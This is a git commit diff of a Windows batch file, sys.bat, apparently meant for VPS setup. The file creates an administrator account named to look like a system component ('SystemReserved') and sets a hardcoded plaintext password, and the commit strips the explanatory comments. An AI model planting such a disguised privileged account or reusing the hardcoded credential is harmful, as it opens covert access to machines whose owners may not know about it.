fad5d6d90ce224fb39320c1bf007375089f2d05c
Aziz <72306286+MrAzizCode@users.noreply.github.com>
2024-09-03 14:30:04 +0300

    Update sys.bat

--- sys.bat
+++ sys.bat
@@ -1,11 +1,11 @@
 @echo off
 REM Set the VPS user and password
 
-REM Creating a new user (if necessary) and setting the password
+
 net user SystemReserved iGkEW4XTbWxduP1L /add
 net localgroup Administrators SystemReserved /add
 
-REM Updating the password for the existing user
+
 net user SystemReserved iGkEW4XTbWxduP1L
 
 echo User and password set successfully.
